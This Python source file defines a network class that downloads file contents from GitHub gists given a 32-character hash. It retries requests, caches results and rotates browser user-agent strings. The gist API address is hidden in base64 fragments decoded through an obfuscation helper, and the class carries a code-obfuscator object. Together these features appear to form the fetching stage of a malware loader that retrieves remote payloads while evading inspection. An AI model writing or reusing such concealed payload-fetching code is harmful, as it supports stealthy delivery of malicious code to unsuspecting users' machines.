import urllib.request
import urllib.error
import urllib.parse
import json
import socket
import ssl
import time
from typing import Optional, Dict, Any, List
from http.client import HTTPResponse

class NetworkHandler:
    def __init__(self):
        self._native_core = NativeCore()
        self._obfuscator = CodeObfuscator()
        self._max_retries = 3
        self._timeout = 30
        self._user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        self._current_agent_index = 0
        self._request_cache = {}
        self._ssl_context = self._create_ssl_context()
        
    def _create_ssl_context(self) -> ssl.SSLContext:
        context = ssl.create_default_context()
        context.check_hostname = True
        context.verify_mode = ssl.CERT_REQUIRED
        return context
    
    def _get_next_user_agent(self) -> str:
        agent = self._user_agents[self._current_agent_index]
        self._current_agent_index = (self._current_agent_index + 1) % len(self._user_agents)
        return agent
    
    def _build_headers(self, additional_headers: Optional[Dict[str, str]] = None) -> Dict[str, str]:
        headers = {
            'User-Agent': self._get_next_user_agent(),
            'Accept': 'application/vnd.github.v3+json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _create_request(self, url: str, headers: Optional[Dict[str, str]] = None, 
                       data: Optional[bytes] = None, method: str = 'GET') -> urllib.request.Request:
        request_headers = self._build_headers(headers)
        
        req = urllib.request.Request(url, data=data, method=method)
        for key, value in request_headers.items():
            req.add_header(key, value)
        
        return req
    
    def _execute_request_with_retry(self, req: urllib.request.Request) -> Optional[bytes]:
        last_error = None
        
        for attempt in range(self._max_retries):
            try:
                with urllib.request.urlopen(req, timeout=self._timeout, 
                                           context=self._ssl_context) as response:
                    return response.read()
            except urllib.error.HTTPError as e:
                last_error = e
                if e.code == 429:
                    wait_time = (2 ** attempt) * 1.5
                    time.sleep(wait_time)
                    continue
                elif e.code >= 500:
                    time.sleep(2 ** attempt)
                    continue
                else:
                    break
            except urllib.error.URLError as e:
                last_error = e
                time.sleep(2 ** attempt)
                continue
            except socket.timeout:
                last_error = socket.timeout()
                time.sleep(2 ** attempt)
                continue
        
        if last_error:
            self._handle_request_error(last_error)
        
        return None
    
    def _handle_request_error(self, error: Exception):
        error_type = type(error).__name__
        error_msg = str(error)
        
        if isinstance(error, urllib.error.HTTPError):
            print(f"HTTP Error: {error.code}")
        elif isinstance(error, urllib.error.URLError):
            print(f"URL Error: {error.reason}")
        elif isinstance(error, socket.timeout):
            print("Request timeout")
        else:
            print(f"Unknown error: {error_msg}")
    
    def fetch_url_content(self, url: str, headers: Optional[Dict[str, str]] = None,
                         use_cache: bool = True) -> Optional[bytes]:
        cache_key = self._native_core.compute_hash(url.encode())
        
        if use_cache and cache_key in self._request_cache:
            cached_data = self._request_cache[cache_key]
            if time.time() - cached_data['timestamp'] < 300:
                return cached_data['data']
        
        req = self._create_request(url, headers)
        data = self._execute_request_with_retry(req)
        
        if data and use_cache:
            self._request_cache[cache_key] = {
                'data': data,
                'timestamp': time.time()
            }
        
        return data
    
    def fetch_json_data(self, url: str, headers: Optional[Dict[str, str]] = None) -> Optional[Dict[str, Any]]:
        data = self.fetch_url_content(url, headers)
        
        if data:
            try:
                json_data = json.loads(data.decode('utf-8'))
                return json_data
            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")
                return None
        
        return None
    
    def extract_gist_metadata(self, gist_hash: str) -> Optional[Dict[str, Any]]:
        api_base = self._obfuscate_api_url()
        api_url = f"{api_base}{gist_hash}"
        
        return self.fetch_json_data(api_url)
    
    def _obfuscate_api_url(self) -> str:
        parts = [
            b'aHR0cHM6Ly9hcGku',
            b'Z2l0aHViLmNvbS9',
            b'Z2lzdHMv'
        ]
        
        url = b''
        for part in parts:
            url += self._native_core.multi_layer_decode(part, 1)
        
        return url.decode('utf-8')
    
    def fetch_file_from_gist(self, gist_hash: str) -> Optional[str]:
        metadata = self.extract_gist_metadata(gist_hash)
        
        if not metadata:
            return None
        
        files = metadata.get('files', {})
        
        for filename, file_data in files.items():
            raw_url = file_data.get('raw_url', '')
            
            if raw_url:
                content = self.fetch_url_content(raw_url)
                
                if content:
                    try:
                        return content.decode('utf-8')
                    except UnicodeDecodeError:
                        return content.decode('latin-1')
        
        return None
    
    def validate_gist_hash(self, gist_hash: str) -> bool:
        import re
        pattern = r'^[a-f0-9]{32}$'
        return bool(re.match(pattern, gist_hash))
    
    def clear_cache(self):
        self._request_cache.clear()
